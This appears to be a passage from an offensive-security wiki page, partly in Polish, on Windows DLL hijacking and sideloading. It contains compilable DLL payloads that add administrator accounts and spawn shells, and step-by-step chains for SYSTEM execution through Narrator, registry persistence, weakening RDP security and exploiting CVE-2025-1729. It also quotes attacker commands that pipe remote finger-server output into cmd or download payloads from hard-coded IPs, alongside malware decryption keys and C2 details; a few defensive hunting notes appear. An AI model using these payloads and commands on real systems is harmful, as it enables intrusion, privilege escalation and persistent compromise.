// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Przykład DLL w C++ z tworzeniem użytkownika</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternatywna biblioteka DLL w języku C z punktem wejścia wątku</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Studium przypadku: DLL Hijack lokalizacyjnej Narrator OneCore TTS (Accessibility/ATs)

Windows Narrator.exe nadal podczas uruchamiania sprawdza przewidywalną, zależną od języka lokalizacyjną bibliotekę DLL, którą można przejąć w celu wykonania dowolnego kodu i utrzymania persistence.<sup>[[7]](#references)</sup>

Najważniejsze fakty
- Ścieżka sprawdzana (bieżące kompilacje): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Starsza ścieżka (starsze kompilacje): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Jeśli w ścieżce OneCore znajduje się zapisywalna biblioteka DLL kontrolowana przez atakującego, zostaje załadowana, a `DllMain(DLL_PROCESS_ATTACH)` zostaje wykonana. Żadne eksporty nie są wymagane.

Rozpoznanie za pomocą Procmon
- Filtr: `Process Name is Narrator.exe` oraz `Operation is Load Image` lub `CreateFile`.
- Uruchom Narrator i obserwuj próbę załadowania powyższej ścieżki.

Minimalna DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Naiwny hijack będzie generować dźwięki/podświetlać UI. Aby zachować ciszę, podczas attach wylicz wątki Narrator, otwórz główny wątek (`OpenThread(THREAD_SUSPEND_RESUME)`) i wstrzymaj go za pomocą `SuspendThread`; kontynuuj działanie we własnym wątku. Pełny kod znajduje się w PoC.<sup>[[8]](#references)</sup>

Trigger and persistence via Accessibility configuration
- Kontekst użytkownika (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Powyższa konfiguracja powoduje załadowanie planted DLL podczas uruchamiania Narrator. Na secure desktop (ekranie logowania) naciśnij CTRL+WIN+ENTER, aby uruchomić Narrator; Twoja DLL wykona się jako SYSTEM na secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Zezwól na klasyczną warstwę bezpieczeństwa RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Połącz się z hostem przez RDP, a na ekranie logowania naciśnij CTRL+WIN+ENTER, aby uruchomić Narrator; Twoja DLL wykona się jako SYSTEM na secure desktop.
- Wykonanie zatrzyma się po zamknięciu sesji RDP — szybko wykonaj inject/migrate.

Bring Your Own Accessibility (BYOA)
- Możesz sklonować wpis rejestru wbudowanego Accessibility Tool (AT), np. CursorIndicator, zmodyfikować go tak, aby wskazywał na dowolny binary/DLL, zaimportować go, a następnie ustawić `configuration` na nazwę tego AT. Umożliwia to proxy dowolnego wykonania w ramach frameworka Accessibility.

Uwagi
- Zapis w `%windir%\System32` i zmiana wartości HKLM wymagają uprawnień administratora.
- Cała logika payloadu może znajdować się w `DLL_PROCESS_ATTACH`; exports nie są wymagane.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Ten przypadek przedstawia **Phantom DLL Hijacking** w Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), śledzony jako **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` znajduje się w `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` uruchamia się codziennie o 9:30 jako zalogowany użytkownik.
- **Directory Permissions**: Możliwość zapisu ma `CREATOR OWNER`, co pozwala użytkownikom lokalnym umieszczać dowolne pliki.
- **DLL Search Behavior**: Program próbuje najpierw załadować `hostfxr.dll` ze swojego katalogu roboczego i rejestruje "NAME NOT FOUND", jeśli pliku brakuje, co wskazuje na pierwszeństwo wyszukiwania w lokalnym katalogu.

### Exploit Implementation

Atakujący może umieścić złośliwy stub `hostfxr.dll` w tym samym katalogu, wykorzystując brakującą DLL do uzyskania code execution w kontekście użytkownika:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Przebieg ataku

1. Jako standardowy użytkownik umieść `hostfxr.dll` w `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Poczekaj, aż scheduled task uruchomi się o 9:30 rano w kontekście bieżącego użytkownika.
3. Jeśli w momencie wykonania zadania zalogowany jest administrator, malicious DLL uruchomi się w sesji administratora ze średnim poziomem integralności.
4. Połącz standardowe techniki UAC bypass, aby przejść ze średniego poziomu integralności do uprawnień SYSTEM.

## Studium przypadku: MSI CustomAction Dropper + DLL Side-Loading przez Signed Host (wsc_proxy.exe)

Threat actors często łączą droppery oparte na MSI z DLL side-loading, aby wykonywać payloady w ramach zaufanego, podpisanego procesu.<sup>[[10]](#references)</sup>

Przegląd łańcucha
- Użytkownik pobiera MSI. CustomAction uruchamia się po cichu podczas instalacji GUI (np. LaunchApplication lub akcja VBScript), odtwarzając kolejny etap z osadzonych zasobów.
- Dropper zapisuje legalny, podpisany EXE oraz malicious DLL w tym samym katalogu (przykładowa para: podpisany przez Avast wsc_proxy.exe + kontrolowany przez attackera wsc.dll).
- Po uruchomieniu podpisanego EXE Windows DLL search order ładuje najpierw wsc.dll z working directory, wykonując kod attackera w ramach podpisanego procesu nadrzędnego (ATT&CK T1574.001).

Analiza MSI (na co zwrócić uwagę)
- Tabela CustomAction:
- Poszukaj wpisów uruchamiających pliki wykonywalne lub VBScript. Przykładowy suspicious pattern: LaunchApplication uruchamiający osadzony plik w tle.
- W Orca (Microsoft Orca.exe) sprawdź tabele CustomAction, InstallExecuteSequence i Binary.
- Osadzone/podzielone payloady w MSI CAB:
- Ekstrakcja administracyjna: msiexec /a package.msi /qb TARGETDIR=C:\out
- Lub użyj lessmsi: lessmsi x package.msi C:\out
- Poszukaj wielu małych fragmentów, które są łączone i odszyfrowywane przez CustomAction VBScript. Typowy przebieg:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading z wsc_proxy.exe
- Umieść te dwa pliki w tym samym folderze:
- wsc_proxy.exe: legalny, podpisany host (Avast). Proces próbuje załadować bibliotekę wsc.dll według nazwy z własnego katalogu.
- wsc.dll: DLL atakującego. Jeśli nie są wymagane konkretne eksporty, wystarczy DllMain; w przeciwnym razie zbuduj proxy DLL i przekieruj wymagane eksporty do oryginalnej biblioteki, uruchamiając payload w DllMain.
- Zbuduj minimalny payload DLL:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- For export requirements, use a proxying framework (e.g., DLLirant/Spartacus) to generate a forwarding DLL that also executes your payload.

- This technique relies on DLL name resolution by the host binary. If the host uses absolute paths or safe loading flags (e.g., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack may fail.
- KnownDLLs, SxS, and forwarded exports can influence precedence and must be considered during selection of the host binary and export set.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point described how Ink Dragon deploys ShadowPad using a **three-file triad** to blend in with legitimate software while keeping the core payload encrypted on disk:<sup>[[12]](#references)</sup>

1. **Signed host EXE** – vendors such as AMD, Realtek, or NVIDIA are abused (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). The attackers rename the executable to look like a Windows binary (for example `conhost.exe`), but the Authenticode signature remains valid.
2. **Malicious loader DLL** – dropped next to the EXE with an expected name (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). The DLL is usually an MFC binary obfuscated with the ScatterBrain framework; its only job is to locate the encrypted blob, decrypt it, and reflectively map ShadowPad.
3. **Encrypted payload blob** – often stored as `<name>.tmp` in the same directory. After memory-mapping the decrypted payload, the loader deletes the TMP file to destroy forensic evidence.

Tradecraft notes:

* Renaming the signed EXE (while keeping the original `OriginalFileName` in the PE header) lets it masquerade as a Windows binary yet retain the vendor signature, so replicate Ink Dragon’s habit of dropping `conhost.exe`-looking binaries that are really AMD/NVIDIA utilities.
* Because the executable stays trusted, most allowlisting controls only need your malicious DLL to sit alongside it. Focus on customizing the loader DLL; the signed parent can typically run untouched.
* ShadowPad’s decryptor expects the TMP blob to live next to the loader and be writable so it can zero the file after mapping. Keep the directory writable until the payload loads; once in memory the TMP file can safely be deleted for OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators pair DLL sideloading with LOLBAS so the only custom artifact on disk is the malicious DLL next to the trusted EXE:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Hidden PowerShell spawns `cmd.exe /c`, pulls commands from a Finger server, and pipes them to `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` pulls TCP/79 text; `| cmd` executes the server response, letting operators rotate second stage server-side.

- **Built-in download/extract:** Download an archive with a benign extension, unpack it, and stage the sideload target plus DLL under a random `%LocalAppData%` folder:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` hides progress and follows redirects; `tar -xf` uses Windows' built-in tar.

- **WMI/CIM launch:** Start the EXE via WMI so telemetry shows a CIM-created process while it loads the colocated DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Works with binaries that prefer local DLLs (e.g., `intelbq.exe`, `nearby_share.exe`); payload (e.g., Remcos) runs under the trusted name.

- **Hunting:** Alert on `forfiles` when `/p`, `/m`, and `/c` appear together; uncommon outside admin scripts.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

A recent Lotus Blossom intrusion abused a trusted update chain to deliver an NSIS-packed dropper that staged a DLL sideload plus fully in-memory payloads.<sup>[[13]](#references)</sup>

Tradecraft flow
- `update.exe` (NSIS) creates `%AppData%\Bluetooth`, marks it **HIDDEN**, drops a renamed Bitdefender Submission Wizard `BluetoothService.exe`, a malicious `log.dll`, and an encrypted blob `BluetoothService`, then launches the EXE.
- The host EXE imports `log.dll` and calls `LogInit`/`LogWrite`. `LogInit` mmap-loads the blob; `LogWrite` decrypts it with a custom LCG-based stream (constants **0x19660D** / **0x3C6EF35F**, key material derived from a prior hash), overwrites the buffer with plaintext shellcode, frees temps, and jumps to it.
- To avoid an IAT, the loader resolves APIs by hashing export names using **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, then applying a Murmur-style avalanche (**0x85EBCA6B**) and comparing against salted target hashes.

Main shellcode (Chrysalis)
- Decrypts a PE-like main module by repeating add/XOR/sub with key `gQ2JR&9;` over five passes, then dynamically loads `Kernel32.dll` → `GetProcAddress` to finish import resolution.
- Reconstructs DLL name strings at runtime via per-character bit-rotate/XOR transforms, then loads `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Uses a second resolver that walks the **PEB → InMemoryOrderModuleList**, parses each export table in 4-byte blocks with Murmur-style mixing, and only falls back to `GetProcAddress` if the hash is not found.

Embedded configuration & C2
- Config lives inside the dropped `BluetoothService` file at **offset 0x30808** (size **0x980**) and is RC4-decrypted with key `qwhvb^435h&*7`, revealing the C2 URL and User-Agent.
- Beacons build a dot-delimited host profile, prepend tag `4Q`, then RC4-encrypt with key `vAuig34%^325hGV` before `HttpSendRequestA` over HTTPS. Responses are RC4-decrypted and dispatched by a tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Execution mode is gated by CLI args: no args = install persistence (service/Run key) pointing to `-i`; `-i` relaunches self with `-k`; `-k` skips install and runs payload.

Alternate loader observed
- The same intrusion dropped Tiny C Compiler and executed `svchost.exe -nostdlib -run conf.c` from `C:\ProgramData\USOShared\`, with `libtcc.dll` beside it. The attacker-supplied C source embedded shellcode, compiled, and ran in-memory without touching the disk with a PE. Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Ten etap kompilacji i uruchamiania oparty na TCC importował `Wininet.dll` w czasie wykonywania i pobierał second-stage shellcode z hardcoded URL, zapewniając elastyczny loader, który podszywał się pod uruchomienie kompilatora.

## Signed-host sideloading with export proxying + host thread parking

Niektóre łańcuchy DLL sideloading dodają **stability engineering**, aby legalny host pozostał aktywny wystarczająco długo, by poprawnie załadować późniejsze etapy, zamiast ulec awarii po załadowaniu malicious DLL.<sup>[[11]](#references)</sup>

Observed pattern
- Upuść zaufany EXE obok malicious DLL, używając oczekiwanej nazwy zależności, takiej jak `version.dll`.
- Malicious DLL **proxies every expected export** z powrotem do rzeczywistej systemowej DLL, na przykład `%SystemRoot%\\System32\\version.dll`, dzięki czemu rozwiązywanie importów nadal działa, a host process może kontynuować pracę.
- Po załadowaniu malicious DLL **patches the host entry point**, aby main thread przechodził do nieskończonej pętli `Sleep`, zamiast kończyć działanie lub wykonywać ścieżki kodu, które zakończyłyby process.
- Nowy thread wykonuje właściwą malicious work: odszyfrowuje nazwę lub ścieżkę next-stage DLL (często stosowane są RC4/XOR), a następnie uruchamia ją za pomocą `LoadLibrary`.

Why this matters
- Zwykłe DLL proxying zachowuje zgodność API, ale nie gwarantuje, że host pozostanie aktywny wystarczająco długo dla późniejszych etapów.
- Zaparkowanie main thread w `Sleep(INFINITE)` to prosty sposób na utrzymanie signed process w pamięci, podczas gdy loader wykonuje deszyfrowanie, staging lub network bootstrap w worker thread.
- Hunting wyłącznie pod kątem podejrzanego `DllMain` może pominąć ten pattern, jeśli interesujące zachowanie występuje dopiero po spatchowaniu host entry point i uruchomieniu secondary thread.

Minimal workflow
1. Skopiuj signed host EXE i ustal DLL, którą rozwiązuje z local directory.
2. Zbuduj proxy DLL eksportującą te same funkcje i przekazującą je do legitimate DLL.
3. W `DllMain(DLL_PROCESS_ATTACH)` utwórz worker thread.
4. Z tego thread spatchuj host entry point lub main thread start routine, aby wykonywał pętlę z `Sleep`.
5. Odszyfruj nazwę/config next-stage DLL i wywołaj `LoadLibrary` albo wykonaj manual-map payloadu.

Defensive pivots
- Signed processes ładujące `version.dll` lub podobne common libraries z własnego application directory zamiast z `System32`.
- Memory patches w process entry point krótko po image load, szczególnie skoki/wywołania przekierowane do `Sleep`/`SleepEx`.
- Threads tworzone przez proxy DLL, które natychmiast wywołują `LoadLibrary` dla drugiej DLL z odszyfrowaną nazwą.
- Full-export proxy DLL umieszczone obok vendor executables we writable staging directories, takich jak `ProgramData`, `%TEMP%` lub ścieżki unpacked archives.

## References

- [1] [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking in Windows. Simple C example.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 Targets Southeast Asian Governments and Critical Infrastructure](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
